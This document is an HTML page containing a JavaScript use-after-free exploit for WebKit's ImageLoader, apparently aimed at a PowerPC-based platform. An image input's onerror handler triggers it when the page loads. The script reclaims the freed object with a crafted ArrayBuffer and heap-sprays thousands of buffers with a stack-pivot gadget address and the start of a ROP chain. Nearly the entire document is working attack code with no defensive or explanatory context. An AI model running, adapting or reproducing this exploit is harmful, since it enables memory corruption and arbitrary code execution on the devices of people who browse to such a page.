<html>
<body>
<script>
function UaF(a)
{   
    var OS_Exit                 = 0x0101cd80;
    var pivotAdress             = 0x010ADDCC;
    var pivotAdressAdress       = 0x1B000000; //r6
    var sizeWebCoreImageLoader  = 0x18;
    var sprayCount              = 2000;
    var _4K                     = 0x1000;
    
    //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
    a.type="radio";
    
    //Allocate this new WebCore::ImageLoader over freed WebCore::
    var ab = new ArrayBuffer(sizeWebCoreImageLoader);
    var dv = new DataView(ab);
    /*
    0:000:x86> dt webkit!WebCore::ImageLoader
       +0x000 __VFN_table : Ptr32 
       +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
       +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
       +0x00c m_failedLoadURL  : WTF::AtomicString
       +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
       +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
       +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
       +0x010 m_imageComplete  : Pos 3, 1 Bit
       +0x010 m_loadManually   : Pos 4, 1 Bit
       +0x010 m_elementIsProtected : Pos 5, 1 Bit
    */
    //Register:r3 Adress:0x1AF35330-0x1AF35360
    dv.setUint32(0x00, 0x00000000);         //vtable
    dv.setUint32(0x04, pivotAdressAdress);  //m_client
    dv.setUint32(0x08, pivotAdressAdress+0x700);         //m_image, must be NULL
    dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
    dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
    dv.setUint32(0x14, 0x00000000);         //padding
    
    //Spray large ArrayBuffer with pivotAdress  
    //Middle range 0x1B000000
    var ar = new Array(sprayCount);
    for(var i=0; i<sprayCount; i++){
        ar[i] = new DataView(new ArrayBuffer(_4K));
        for(var j=0; j<_4K; j+=4){
            ar[i].setUint32(j, j); //filler
        }

        ar[i].setUint32(0x904, 0x0);
        ar[i].setUint32(0x018, pivotAdressAdress+0x100);
        ar[i].setUint32(0x100, pivotAdressAdress+0x200);
        ar[i].setUint32(0x49C, pivotAdress); //lwz r0, 0x4(r11) ; mtlr r0 ; mr r1, r11 ; li r3, -0x1 ; blr ;
        //r11, new stack location
        ar[i].setUint32(0x908, pivotAdressAdress+0xA00);
        
        //Fake stack & Rop chain start at 0xA00
        ar[i].setUint32(0xA04, OS_Exit); //first gadget
        /*for(var j=0xA00; j<0xF00; j+=4){
            ar[i].setUint32(j, OS_Exit);
        }*/
    }
    
    
    //Use the new WebCore::ImageLoader & pivot !
    return 0;
}
</script>
<input id="x" type="image" onerror="UaF(this);" src="" />
</body>
</html> 